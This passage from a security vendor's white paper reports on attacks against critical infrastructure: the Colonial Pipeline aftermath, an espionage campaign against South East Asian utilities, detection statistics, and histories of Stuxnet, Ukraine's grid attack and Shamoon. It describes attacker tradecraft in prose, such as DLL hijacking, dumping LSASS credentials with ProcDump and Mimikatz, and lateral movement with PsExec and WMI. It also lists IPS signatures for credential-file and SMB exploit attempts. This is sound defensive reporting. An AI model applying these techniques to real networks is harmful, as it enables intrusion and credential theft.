group following the Colonial attack put it under pressure, but \nwhether this is in fact the last we see of these ransomware actors remains to be seen.  \n\nhttps://www.elliptic.co/blog/darkside-ransomware-has-netted-over-90-million-in-bitcoin\nhttps://therecord.media/darkside-ransomware-gang-says-it-lost-control-of-its-servers-money-a-day-after-biden-threat/\nhttps://www.wsj.com/articles/u-s-retrieves-millions-paid-to-colonial-pipeline-hackers-11623094399\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nImpact\n\nAs well as the obvious and immediate impact of this attack on Colonial itself, and the disruption to fuel supplies, the \nattack was also followed by some political pronouncements.\n\nU.S. President Biden signed an executive order (EO) on May 12 aimed at modernizing U.S. defenses against cyber \nattacks, and allowing more timely access to information needed for law enforcement to conduct investigations. The \n34-page EO followed several attacks targeting U.S. interests over the preceding few months, including the attack \non Colonial, and the SolarWinds supply chain attacks.\n\nThe Executive Order on Improving the Nation’s Cybersecurity called for a number of actions, including:\n\n•\t Removing barriers to threat information sharing between government and the private sector\n\n•\t Modernizing and implementing stronger cyber security standards in the federal government\n\n•\t Improving software supply chain security\n\n•\t Establishing a cyber security safety review board\n\n•\t Creating a standard playbook for responding to cyber incidents\n\n•\t Improving detection of cyber security incidents on federal government networks\n\n•\t Improving investigative and remediation capabilities\n\nThe White House said the EO was the “the first of many ambitious steps the Administration is taking to modernize \nnational cyber defenses.” \n\nIn the wake of the Colonial attack, the U.S. Department of Homeland Security also issued a Security Directive \nfor the oil and gas pipeline industry. The Directive, which will be administered by the Transportation Security \nAdministration (TSA) and Cybersecurity and Infrastructure Security Agency (CISA), was published on May 27, 2021, \nand replaced voluntary guidelines that had been in place for more than a decade.\n\nThe Directive requires critical pipeline owners and operators to report any confirmed or potential cyber security \nincidents to CISA. They are also required to have a designated cyber security coordinator who is available 24/7. The \nDirective also stipulated that pipeline owners and operators needed to review their practices to identify any gaps \nand related remediation measures, and report the results to TSA and CISA within 30 days. TSA said it would also \nconsider follow-on mandatory measures in the future that would “further support the pipeline industry in enhancing \nits cyber security.” When announcing the directive, Secretary of Homeland Security Alejandro N. Mayorkas \nreferenced the Colonial attack, stating: “The recent ransomware attack on a major petroleum pipeline demonstrates \nthat the cyber security of pipeline systems is critical to our homeland security.” He also said the DHS would work \nclosely with the private sector to “increase the resilience of our nation’s critical infrastructure.”\n\nThe Department of Justice (DoJ) also established a Ransomware and Digital Extortion Task Force in the wake of \nthe attack, which it said was “established to investigate, disrupt and prosecute ransomware and digital extortion \nactivity.” The DoJ also said that ransomware incidents would be given a similar priority as investigations into acts of \nterrorism.\n\nThe Colonial attack also had an impact outside of the U.S., with the South Korean government ordering a review of \nthe cyber security preparedness of its energy infrastructure. South Korea’s Minister of Trade, Industry and Energy, \nMoon Seung-wook, said that in the wake of the disruption at Colonial it was “necessary to thoroughly examine \nwhether cyber security preparations and countermeasures for our energy-related infrastructure are properly in \nplace.” He ordered all operators of oil pipelines, power grids, gas pipelines, and emergency response systems to \ncheck the status of their systems and report back on their findings. \n\nThe Japanese government also announced it would introduce new regulations for 14 critical infrastructure sectors \nto bolster cyber defenses, in the wake of the Colonial attack. The sectors included areas like telecommunications, \nelectricity, railroads, government services, and healthcare. The government will require operators of such key \ninfrastructure to address national security concerns when procuring foreign-made equipment.\n\nThe wide-ranging impact of the Colonial attack is interesting. It appears to have raised awareness worldwide of \nthe dangers posed by potential cyber attacks on companies involved in CNI, and has led to authorities in the U.S., \nparticularly, showing a determination to crack down on ransomware attackers to a degree we hadn’t previously seen.\n\nhttps://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/\nhttps://symantec-enterprise-blogs.security.com/blogs/solarwinds\nhttps://www.dhs.gov/news/2021/05/27/dhs-announces-new-cybersecurity-requirements-critical-pipeline-owners-and-operators\nhttps://www.dhs.gov/news/2021/05/27/dhs-announces-new-cybersecurity-requirements-critical-pipeline-owners-and-operators\nhttps://mobile-reuters-com.cdn.ampproject.org/c/s/mobile.reuters.com/article/amp/idUSL2N2NC1SD\nhttps://mobile-reuters-com.cdn.ampproject.org/c/s/mobile.reuters.com/article/amp/idUSL2N2NC1SD\nhttps://www.theregister.com/2021/05/12/south_korea_security_review\nhttps://asia.nikkei.com/Business/Technology/Japan-to-restrict-use-of-foreign-tech-in-telecom-power-grids\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nCase Study: \nConcerted Attacks on CNI in South East Asia\n\nSymantec researchers observed attacks on a \nnumber of organizations that were part of the \nCNI sector in a South East Asian country. These \nattacks were ongoing since at least November \n2020, and continued right up to March 2021. \nIntelligence gathering was thought to be the \nlikely motivation in these attacks. \n\nVictims were seen in multiple organizations \nthat all fall under the umbrella of CNI, including \nin the areas of water, power, defense, and \ncommunications. There are some indications that \nthe attacker is based in China, but the activity \ncannot be attributed to any one particular group.\n\nThere are numerous indications that the attacks \non the different organizations were carried out by \nthe same attacker, including:\n\n•\t The geographic and sector links of the \naffected organizations\n\n•\t The presence of certain artifacts on \nmachines in the different organizations, \nincluding a downloader (found in two of the \norganizations), and a keylogger (found in \nthree of the organizations)\n\n•\t The same IP address is also seen in attacks \non two of the organizations\n\nCredential theft and lateral movement on victim \nnetworks seemed to be a key aim of the attacker, \nwho made extensive use of living-off-the-land \ntools in this campaign. While we do not know \nwhat the initial infection vector used by the \nattacker to get onto targeted networks was, we do \nsee how they moved through infected networks.\n\nWater Company\n\nThe first activity we saw in the attack on this \norganization was suspicious use of Windows \nManagement Instrumentation (WMI); there is no \nindication of what infection vector was used to \ngain initial access to the machine. A legitimate \nfree multimedia player called PotPlayer Mini was \nexploited by the attackers to load a malicious DLL. \nFireEye has previously published research about \nhow this player was susceptible to DLL search \norder hijacking. DLL search order hijacking is not \na new technique, but we do still see it frequently \nleveraged by attackers to insert malicious \nfiles onto victim machines. We saw PotPlayer \nMini added as a service to launch a file called \npotplayermini.exe, we then saw multiple dual-use \nand hacking tools launched, including:\n\n•\t ProcDump\n\n•\t PsExec\n\n•\t Mimikatz\n\nProcDump was used for credential theft by \nabusing the LSASS.exe process, and domain \nshares were enumerated using net view. We \nthen observed a suspected tunneling tool being \nlaunched on the system. The machine targeted by \nthe attackers in this instance had tools on it that \nindicate it may have been involved in the design of \nSCADA systems. \n\nPower Company\n\nSimilar activity was seen in a company in the \npower sector. In that instance too, PotPlayer Mini \nwas exploited to carry out DLL search order \nhijacking and ProcDump was deployed alongside \nanother payload that we suspect was malware. \nWe also saw the attacker once again carrying out \ncredential theft by using ProcDump of the LSASS.\nexe process. There were indications here too \nthat this machine may also have been involved in \nengineering design.\n\nThere was some file overlap between the attacks \non both the water and power company as well as \nsimilar tactics used—pointing to the same actor \nbeing behind both events. \n\nCase Study: Concerted Attacks on CNI in South East Asia\n\nhttps://www.fireeye.com/blog/threat-research/2020/01/abusing-dll-misconfigurations.html\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nCommunications Company\n\nAn interesting aspect of this attack was that the \nattacker appeared to have exploited a different \nlegitimate tool, Google Chrome Frame, with \nsuspicious files appearing where chrome_frame_\nhelper.exe was the parent file. Google Chrome \nFrame is a plugin for Internet Explorer that \nenables rendering the full browser canvas using \nGoogle Chrome’s rendering engine.\n\nIt wasn’t clear if Google Chrome Frame was \nalready present on the machine or if it was \nintroduced by the attacker, however, it was the \nparent file of legitimate as well as suspicious files. \nPotPlayer Mini also appeared to be exploited \non this machine by the attacker for malicious \npurposes. \n\nPAExec, a tool similar to PsExec, launched at.exe \n(a Windows task scheduler) in order to schedule \nexecution of chrome_frame_helper.exe as a task. \nWMI was used to run chrome_frame_helper.\nexe and perform credential theft by dumping \nLSASS. PsExec and WMIC were also used for \nlateral movement and to launch chrome_frame_\nhelper.exe against an internal IP address. PsExec \nalso launched it to schedule execution of an \nunknown batch file as a daily task, and chrome_\nframe_helper.exe was also used to launch the \nSharpHound domain trust enumeration tool \nand other suspicious files. PsExec was also seen \nexecuting what appeared to be Mimikatz for \nsuspected credential theft.\n\nWMI was used to run chrome_frame_helper.exe to \nexecute a net.exe command to connect a hidden \nC$ share. This type of share is not visible when \nviewing another computer’s shares. However, \nit is still accessible if the name of the hidden \nshare is known. Persistence was created for \nchrome_frame_helper.exe as a scheduled task—\nGoogleUpdateTaskMachineCore4f23—with the file \ndisguised as chrome_proxy1.exe.\n\nDefense Organization\n\nIn the defense organization we once again \nsaw PotPlayer Mini exploited for DLL search \norder hijacking, as well as seeing some file \noverlaps between this organization and the \ncommunications and water companies. \n\nConclusion\n\nWhile we cannot definitively say what the \nend goal of the attacker was in these attacks, \ninformation stealing seems like the likeliest motive, \ngiven the activity we did see (credential stealing, \nlateral movement), and the types of machines \ntargeted in some of the organizations (those \ninvolved in design or engineering). The ability of \nthe attacker to maintain a stealthy presence on \nthe targeted networks for a number of months \nindicates they were skilled. Certain artifacts found \non the victim machines indicate the attacker may \nbe based in China, though it is not possible with \nthe information we have to definitively attribute \nthese attacks to a named actor.\n\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nWhat the Data Tells Us \nWhen we examine the malicious activity targeted at our CNI customers, it would appear that an increasing number \nof attackers are attempting to attack CNI organizations, but the number of attackers successfully gaining access \nand installing malware on the endpoint in this sector is trending down.\n\nNetwork-based detections indicate that malicious activity targeted at CNI organizations is on the rise. Attacks \nblocked on the network by our Intrusion Prevention System (IPS) technologies help reveal information about the \nextent of malicious activity on organizations’ networks. If a machine on a network becomes infected, the malware is \nlikely to attempt to contact a command and control (C&C) server, which can also trigger these detections. Looking \nat the number of network detections attempting to contact a C&C server gives an indication of the number of \ninfected machines on a network and a picture of the extent of malicious activity in a sector. \n\nNetwork-based activity trended upwards over the time period we looked at, with an increase in June 2020 carrying \nthrough to February 2021. While these detections dropped slightly in March and April 2021, the overall trend is still \nincreasing.\n\nFigure 1: Malicious Activity Blocked on the Network by Month in CNI Customers, January 2020 to April 2021\n\n0\n\n200,000\n\n400,000\n\n600,000\n\n800,000\n\n1,000,000\n\n1,200,000\n\nAprMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nB\no\n\nck\ned\n\n S\nig\n\nna\ntu\n\nre\ns\n\nThe top 10 signatures blocked are primarily signatures that block attempts to exploit remote code execution (RCE) \nvulnerabilities that allow attackers to execute attacks on target organizations from wherever they are in the world. \n\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nFigure 2: Top 10 IPS Signatures Blocked on the Networks of CNI Customers, January 2020 to April 2021\n\n.2.0 .4 .6 .8 1.0\n\nWeb Attack: Hylafax Faxsurvey Remote Password Access CVE-1999-0262\n\nWeb Attack: Cisco RV320 & RV325 Routers CVE-2019-1653\n\nWeb Attack: ColdFusion Remote Code Exec CVE-2010-2861\n\nAttack: Apache Struts CVE 2017 9805 2\n\nWeb Attack: Microsoft IIS 3 File Creation CVE-1999-0191\n\nMalicious Site: Malicious Domain Request 21\n\nWeb Attack: Passwd File Download Attempt\n\nMalicious Site: Malicious Domain Request 22\n\nAttack: SMB Double Pulsar Ping\n\nOS Attack: Microsoft SMB MS17-010 Disclosure Attempt\n\nBlocked IPS Signatures (Million)\n\nThe most commonly seen blocking signature—OS Attack: Microsoft SMB MS17-010 Disclosure Attempt—detects \nattempts to exploit a RCE vulnerability in Microsoft Windows SMB Service, which was famously used in the \ndisruptive WannaCry ransomware attack in 2017.\n\nThe U.S. is the country that sees by far the most activity targeting the networks of CNI organizations, with it \naccounting for 10-times as many network blocks as Singapore and China—the countries in second and third position \nin the top 10. Despite the concentration of malicious activity on the network of CNI customers in the U.S., overall the \ntop 10 is a global picture, featuring countries from Europe and South America as well as Asia and the U.S.\n\nFigure 3: Top 10 Countries for Network Blocks on the Machines of CNI Customers, January 2020 to April 2021\n\nGermany  1%\nItaly  2%\n\nGreat Britain  2%\n\nNetherlands  3%\n\nBrazil  3%\n\nFrance  4%\n\nSpain  4%\n\nChina  6%\n\nSingapore  6%\n\nU.S.\n69%\n\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/wannacry-ransomware-attack\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nHowever, in something of a contrast, reviewing the data for malware activity on the endpoint in the CNI sector \nsince the beginning of 2020 to April 2021 doesn’t reveal any particularly dramatic trends. Malware activity on the \nendpoint in the sector has remained reasonably steady in that time period. We saw something of a spike in May \n2020, but after that, activity returned to a fairly steady level, even declining slightly.\n \nFigure 4: Malware Detections by Month for CNI Customers, January 2020 to April 2021\n\n0\n\n10,000\n\n20,000\n\n30,000\n\n40,000\n\n50,000\n\n60,000\n\n70,000\n\n80,000\n\n90,000\n\nAprMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nD\net\n\nec\nti\n\no\nns\n\n \n\nWhen we look at the top 10 detections being triggered by CNI customers, a lot of those detections are heuristic \ndetections, which detect and block a wide range of different malware.

However, the presence of \ncountries in other parts of Asia and also Europe in the top 10 does further demonstrate that malware attacks aimed \nat CNI are a global issue.\n \nFigure 6: Top 10 Countries for Malware Detections on the Machines of CNI Customers, January 2020 to April 2021\n\nItaly  2%\n\nSingapore  2%\n\nIndonesia  2%\n\nFrance  2%\n\nGermany  3%\n\nGreat Britain  3%\n\nSouth Korea  3%\n\nBrazil  3%\n\nChina\n48%\n\nU.S.\n32%\n\nRansomware \n\nRansomware activity aimed at organizations in the CNI sector remained reasonably steady over the period \nexamined, although there was a spike in May 2020, with ransomware numbers somewhat elevated for several of the \nmiddle months of 2020. While we did see a small drop in malicious activity in general at the very beginning of the \nCOVID-19 pandemic, as threat actors presumably also adjusted to a new way of working and targeting victims, this \ndrop did not last long, and malicious activity did, in many cases, return to and even exceed pre-pandemic levels. It \nis possible the May spike was a return to activity for actors after a small decline in March and April.\n \n\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nFigure 7: Ransomware Detections by Month for CNI Customers, January 2020 to April 2021\n\n0\n\n50\n\n100\n\n150\n\n200\n\n250\n\n300\n\n350\n\n400\n\n450\n\n500\n\nAprMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nD\net\n\nec\nti\n\no\nns\n\nWhile the ransomware numbers may not appear to be huge, ransomware attacks now are a lot more targeted, \nwith the days of mass spamming ransomware campaigns largely a thing of the past. Most ransomware groups \nthese days spend a long time planning attacks, potentially spending a long time on compromised systems carrying \nout reconnaissance and exfiltrating data before deploying ransomware. Due to the large paydays offered by \nransomware attacks now, malicious ransomware actors tend to carry out fewer attacks for greater rewards. \n \nFigure 8: Targeted Ransomware Detections by Month for CNI Customers, January 2020 to April 2021\n\n0.0\n\n0.5\n\n1.0\n\n1.5\n\n2.0\n\n2.5\n\n3.0\n\n3.5\n\n4.0\n\n4.5\n\nAprMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nD\net\n\nec\nti\n\no\nns\n\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nWhile the number of targeted ransomware attacks aimed at organizations in the CNI sector over the period we \nexamined may seem low—averaging at around two per month—just one attack every few weeks can easily give \nattackers the outcome they want. It should also be noted that the data shown in Figure 8 is only a representative \nsample of the overall number of attacks involving targeted ransomware. Most targeted ransomware operators \nrecompile their payloads for every new attack. This means that the variant of the ransomware used in an attack \nmay be blocked by a generic or machine learning-generated detection signature rather than a detection linked to \nthat ransomware family. \n\nThe Colonial Pipeline attack demonstrated that just one ransomware attack on a key organization can lead to \nwide-ranging disruption, and potentially a big payday for attackers. JBS Foods, one of the world’s largest meat \nproducers, paid $11 million to the REvil ransomware gang on June 1, 2021, after a ransomware attack on the \ncompany encrypted some of its operations in North America and Australia, leading to significant disruption. REvil \nhad also threatened to leak data it said it had stolen from the company. \n\nFor organizations that become infected with ransomware—particularly when they are in critical sectors like \nenergy, food production, or health—trying to balance the risks of not paying with the knowledge that paying \nonly encourages attackers to continue carrying out these kinds of attacks can be a difficult balancing act. An \norganization’s desire and sometimes need to avoid long-term disruption, and potentially recovery costs significantly \ngreater than the cost of paying a ransom, can lead to big paydays for ransomware criminals.   \n\nAttack Tactics, Techniques, and Procedures\n\nIn 2021, malware detections tell only part of the malicious activity story, with the popularity of living-off-the-land \ntechniques among malicious actors these days meaning that a lot of malicious activity can occur without any \nmalicious tools being deployed. For this reason, Symantec Cloud Analytics doesn’t just detect malicious tools, but \nrather it draws on intelligence gathered from analyst investigations and leverages advanced machine learning to \nidentify and block patterns of suspicious activity. It then classifies all incidents with a MITRE ATT&CK® technique \nname. With millions of incidents logged each year, it is possible to form a picture of what the most frequently used  \ntechniques are. \n\nFigure 9: Top 10 MITRE Techniques Used in Attacks Against CNI Customers, January 2020 to April 2021\n\n0 .2 .4 .6 .8 1.0 1.2\n\nMasquerading\n\nRemote Access Tools\n\nModify Registry\n\nResource Hijacking\n\nWMI\n\nCredential Dumping\n\nRegsvr32\n\nObfuscated Files or Information\n\nRemote File Copy\n\nPowerShell\n\nTechnique Detections (Million)\n\nhttps://www.bleepingcomputer.com/news/security/jbs-paid-11-million-to-revil-ransomware-225m-first-demanded/\nhttps://attack.mitre.org/\nhttps://attack.mitre.org/\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nThe top 10 MITRE techniques used in attacks against CNI customers are familiar names that we frequently see \nleveraged by malicious actors in a wide range of attacks. PowerShell, for example, the technique we see leveraged \nmost often by attackers, is by far the most popular dual-use tool used by attackers. It is a powerful and versatile \ntool for malicious actors, but it is also widely used for legitimate purposes. Malicious usage still only accounts for a \nsmall percentage of overall PowerShell usage, meaning that attackers abusing it are often able to hide in plain sight \non victim machines. \n\nLiving-off-the-land techniques allow attackers to minimize malware usage, deploying it only when necessary and \nsometimes, as often in the case of ransomware, at such a late stage in the attack that the victim has little or no time \nto respond and stop the attack. The popularity of living-off-the-land tools for attackers is demonstrated in the  \ncase study earlier in the paper, where the attackers made wide use of living-off-the-land tools and techniques in \ntheir attack chain. \n\nActivity like that is why having protection in place that can spot suspicious activity before malware is deployed is \nimportant for organizations striving to keep their networks safe.\n\nOther Noteworthy Attacks on CNI\nWhile extremely high-profile, the attack on Colonial Pipeline was not the first impactful attack on CNI infrastructure \nwe have seen.\n\nStuxnet and the Threat of “Cyber-Physical” Attacks\n\nProbably one of the most famous cyber attacks to ever occur, the Stuxnet attack is believed to have begun in late \n2007 when the digital weapon was deployed against centrifuges at a uranium enrichment plant. That attack was \ndiscovered and widely reported on in 2010. The immense sophistication of the attack meant that the presumption \nwas that a nation state was behind it, with the Stuxnet attack now widely believed to have been powered by a \ncyber weapon developed over the course of a number of years in a collaborative effort between the U.S. and Israel. \n\nStuxnet was the first example of a cyber attack having a physical impact, damaging, as it did, centrifuges at a \nnuclear enrichment facility in Natanz, Iran. Stuxnet worked by modifying the centrifuge speeds, causing them to \nspeed up and become damaged or destroyed. The output at the nuclear plant was reported as dropping by a third \nduring the time it was infected with Stuxnet. Stuxnet was a highly targeted attack that was only ever intended to \ninfect the targeted networks but an error in the code meant it spread to a computer that had been connected to \nthe centrifuges and then made its way onto the internet to spread further. However, as Stuxnet was specifically \nprogrammed to target Siemens Step7 software on computers controlling programmable logic controllers (PLCs), it \ncaused little damage outside of the targeted networks.\n\nStuxnet showed for the first time in real life that it was possible for “cyber” attacks to cross over and become \n“physical” attacks with a real-world impact. The possibility of this occurring was—and remains—a major fear for \ngovernments and corporations worldwide. The sophistication of Stuxnet showed that, while not easy to execute, it \nwas possible to carry out attacks like this.\n\nFor a long time Stuxnet appeared to be an outlier, and we didn’t see another cyber attack causing physical \ndamage to infrastructure until 2014. Just before Christmas that year, a report was released revealing that hackers \nhad struck an unnamed steel mill in Germany. They manipulated and disrupted the control systems in the mill so \nmuch that a blast furnace could not be properly shut down, resulting in what was described as “massive” damage. \nGermany’s Federal Office for Information Security (BSI), which issued the report about the incident, indicated that \nthe attackers gained access to the steel mill through the plant’s business network, then successively gained access \nto the production network, which allowed them to access systems controlling plant equipment. The attackers were \nbelieved to have gained initial access to the corporate network through a spear-phishing email. Once they had \nan initial foothold they were able to explore the company’s networks and eventually compromise a “multitude” \nof systems, including industrial components on the production network. The report said that as a result of this \nunauthorized access the plant was “unable to shut down a blast furnace in a regulated manner” which resulted in \n“massive damage to the system.”\n\nhttps://community.broadcom.com/symantecenterprise/viewdocument/stuxnet-05-disrupting-uranium-pro?CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments\nhttps://www.wired.com/2015/01/german-steel-mill-hack-destruction/\nhttps://www.wired.com/2015/01/german-steel-mill-hack-destruction/\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nAuthorities in Germany did say at the time that the attackers appeared to possess knowledge of industrial control \nsystems, however, it is not clear if causing destructive physical damage to the steel mill was part of the attacker’s \nplan, or if the incident was collateral damage of their presence on the network.\n\nIf it was accidental, it demonstrates that it isn’t just extremely sophisticated attackers like those behind Stuxnet that \norganizations need to worry about causing physical damage. It is unlikely that all the malware used to infiltrate ICS \nand other networks will be as well designed as Stuxnet, leading to the possibility that incidents that lead to real-\nworld damage could be unintentionally caused as collateral damage. \n\nWhile Stuxnet took elaborate steps in order to gain access to air-gapped networks, the attackers who targeted \nthe German steel mill appear to have been able to jump from the corporate network to the production side of the \nplant. Incidents like this serve to underline the importance of good cyber practices like network segmentation and \nZero Trust policies, so that if attackers compromise one part of your network they do not gain access to the entire \nsystem.\n\nBlackout: The Dangers of Power Grid Attacks\n\nThe attack on the Ukraine power grid took place on December 23, 2015, and was the first confirmed hack to bring \ndown a power grid. Such an attack had been long feared given the immense disruption such an outage could \ncause. That this attack took place in the depths of Europe’s winter underlined the seriousness of the situation, with \nthe average temperature in Ukraine in December often dipping below 32 degrees Fahrenheit (zero degrees Celsius). \n\nThe attack on the Ukrainian power grid was very sophisticated, with the attackers thought to have been on the \npower grid systems for several months before they deployed the malware. The attack began with a spear-phishing \ncampaign targeting IT staff and system administrators working for multiple companies responsible for distributing \nelectricity throughout Ukraine. The email had an attachment that contained malicious macros; if this was opened \na malicious backdoor called BlackEnergy was downloaded onto the corporate network. However, this only gave \nhackers access to the corporate network, and it is understood that the targeted power distribution companies in \nUkraine did have network segmentation in place, with a firewall separating the corporate network from the SCADA \nnetwork that controlled the power grid. However, the attackers explored the corporate network, conducting \nreconnaissance and eventually gaining access to the Windows Domain Controllers, where they were able to harvest \nworker credentials for the VPNs used to remotely log in to the SCADA network. As workers logging remotely into \nthe SCADA network weren’t required to use multi-factor authentication, once the attackers had access to those \ncredentials they were able to log in to the SCADA network. \n\nThis shows the importance of having all the different facets of your organization’s cyber security strategy \nimplemented. While the power grid companies in Ukraine were doing the right thing by having their networks \nsegregated, the fact they didn’t have multi-factor authentication set up for all workers logging remotely into the \nSCADA network meant that attackers were ultimately able to overcome that hurdle to gain access to the SCADA \nnetwork anyway. \n\nOnce on the SCADA network, the attackers went to the trouble of replacing the legitimate firmware on Serial-to-\nEthernet converters in order to prevent the operators from sending remote commands to re-close breakers once \na blackout occurred. They were then ready to carry out their attacks, opening circuit breakers to plunge tracts of \nUkraine into darkness. They also flooded the power companies’ customer call centers with phone calls to take them \noffline when customers wanted to contact them. The attackers also deployed a wiper malware called KillDisk to \nwipe files from operator stations to render them inoperable. \n\nUltimately in this incident, the attackers hit three power distribution centers, took around 60 substations offline, \nand left almost a quarter of a million Ukrainians in darkness. In this instance, authorities were able to get the lights \nturned back on quickly—with the longest outage lasting six hours—but the impact of the attacks were felt in the \npower distribution centers for several months as several actions could no longer be performed remotely. Given the \nskill levels of the actors in this attack and the access they achieved on the network, the consequences of this attack \ncould have been a lot more serious than they were, and it certainly served as a warning to power companies of the \nlevel of destruction attackers could deploy on power grids. \n\nhttps://www.wired.com/2016/03/inside-cunning-unprecedented-hack-ukraines-power-grid/\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nWhile this attack occurred in a European country, and not the U.S., similar environments are likely to exist in U.S. \npower distribution centers, meaning the threat of such an attack is there wherever in the world your organization \nmay be located. While we have not yet seen U.S. electricity disrupted by a cyber attack, an AP investigation in \nthe same year the Ukraine attack took place showed that the U.S. power grid was certainly of interest to foreign \nadversaries, a fact that is unlikely to have changed in the last few years. \n\nShamoon: Destructive Attacks Threaten Oil Industry in Middle East\n\nThe threat widely known as Shamoon (W32.Disttrack) first appeared in 2012, when it was used in a targeted attack \nagainst at least one organization in the energy sector in Saudi Arabia. Shamoon is notable because it is a wiper \nmalware that corrupts files on an infected machine and overwrites the Master Boot Record (MBR) in order to \nmake the computer unusable. Those deploying Shamoon appear to have destruction as their goal, as opposed to \nespionage or financial gain, the more common motives for cyber attacks. \n\nShamoon was seen again in 2016, when a slightly modified version of the malware was once again used in \ndestructive attacks aimed at the Saudi energy sector. In the 2012 attacks, infected computers had their MBRs wiped \nand replaced with an image of a burning U.S. flag. The 2016 attacks instead used a photo of the body of Alan Kurdi, \na three year-old Syrian refugee who drowned in the Mediterranean Sea in 2015. The attacks appeared timed to \ncause maximum destruction. The malware was configured to trigger on Thursday night, local time, on November \n17, 2016. The Saudi working week runs from Sunday to Thursday, meaning computers were wiped after most staff \nhad left for the weekend, minimizing the chance of discovery before the attack was complete. It also appeared the \nattackers had done a significant amount of preparatory work for the operation, as the malware was configured with \ncredentials that appear to have been stolen from the targeted organizations, allowing it to move laterally across \nmachines on the network.\n\nShamoon reappeared again in 2018, again focusing on targets in the Middle East, with victims that time in the \nUnited Arab Emirates (UAE), as well as Saudi Arabia. Once again, the victims operated in the oil and gas sector. \nHowever, these attacks were slightly different from prior incidents as they involved a new, second piece of wiping \nmalware (Trojan.Filerase). This malware would delete and overwrite files on the infected computer, while Shamoon \nitself erased the computer’s MBR. The addition of the Filerase malware made the attacks even more destructive as \ndeleting the files before erasing the MBR meant they could not be recovered.\n\nAlthough attacks involving destructive malware such as Shamoon are relatively rare, they can be highly disruptive \nfor the targeted organization, potentially knocking mission-critical computers offline and leading to the loss of \nimportant files. The fact that Shamoon seems to reappear every few years means that corporations, particularly any \nthat have operations in the Middle East, need to be aware of this threat and prepared, with comprehensive backups \nand a robust security strategy in place.\n\nShamoon attacks are believed to be associated with malicious actors operating out of Iran, with the attacks often \ntending to coincide with periods of heightened instability in the region. The fact the attackers also seemed to have \nbeen evolving their attacks, with the addition of the Filerase malware in the most recent wave of attacks, should \nalso be a cause of heightened vigilance against attacks of this type. \n\nIranian hackers were also linked to an intrusion at the Bowman Avenue Dam, a small dam in New York State, in 2013. \nMedia reports said the hackers were believed to have gained access to the dam through a cellular modem. The \nhackers reportedly didn’t take control of the dam but probed the system, possibly discovering information about \nhow the computers running the flood control system worked. This intrusion occurred in 2013, but information about \nit didn’t emerge until 2015. While no damage was caused during this attack, it serves to demonstrate the interest \nforeign adversaries have in U.S. critical infrastructure organizations.\n\nhttps://phys.org/news/2015-12-power-grid-vulnerable-foreign-hacks.html\nhttps://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=281521ea-2d18-4bf9-9e88-8b1dc41cfdb6&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shamoon-back-destructive\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shamoon-destructive-threat-re-emerges-new-sting-its-tail\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/tensions-iran-destructive-attacks\nhttps://www.wsj.com/articles/iranian-hackers-infiltrated-new-york-dam-in-2013-1450662559\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nConclusion\nThe Colonial Pipeline attack underlined that ransomware, with its ability to shut down operations and cause \nsignificant business impact, can be just as disruptive a threat as the so-called “destructive” malware that we saw \ndeployed in, for example, the Shamoon and Stuxnet attacks. A recent Conti ransomware attack on the Irish Health \nService Executive (HSE), the country’s national healthcare service, also demonstrated how disruptive ransomware \nattacks can be. The attack on the HSE led to the cancellation of many services and major disruption, with \nauthorities there vowing not to pay a ransom and predicting it would take many weeks for the service to recover \nfrom the attack. Targeted ransomware attacks that also steal data and demand large ransoms are one of the \nbiggest cyber security threats for all sectors at the moment, and CNI is no exception. \n\nThe impact on the public that can be caused by cyber attacks on CNI industries, such as essential services being \nforced offline for a period, also means that attacks on organizations in this industry can be hard to keep from the \npublic and media, potentially leading to awkward questions and possible damage to businesses’ reputations.\n\nMeanwhile, a somewhat unique challenge faced by CNI is the effect cyber-physical attacks could have on the \nsector, with the prospect of attackers being able to destroy equipment or gain control of things like dams or \nelectricity substations a particular danger that this sector has to deal with.\n\nWe have seen companies in the CNI sector from the U.S. to Europe to the Middle East targeted with serious and \ndisruptive attacks, so there is no region in which CNI organizations can assume they are not under threat of a \nserious cyber attack. All these threats underline that organizations operating in this sector need to have a robust \ncyber security strategy in place in order to keep their networks, equipment, and customers, safe. \n\nhttps://www.bbc.com/news/world-europe-57184977\nhttps://www.bbc.com/news/world-europe-57184977\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nMitigation\nSymantec security experts recommend users observe the following best practices to protect their networks:\n\n•\t Look to deploy an integrated cyber defense platform that shares threat data from endpoint, email, web, cloud \napps, and infrastructure. \n\n•\t Ensure multi-factor authentication is enabled for all accounts using your network.\n\n•\t Monitor the use of dual-use tools inside your network.\n\n•\t Ensure you have the latest version of PowerShell and you have logging enabled.\n\n•\t Restrict access to Remote Desktop Protocol (RDP) services by only allowing RDP from specific known IP \naddresses.\n\n•\t Implement proper audit and control of administrative account usage. You could also implement one-time \ncredentials for administrative work to help prevent theft and misuse of admin credentials.\n\n•\t Ensure any legacy applications that are no longer in use are removed from all machines on your network so \nthey cannot be misused. \n\n•\t Create profiles of usage for admin tools. Many of these tools are used by 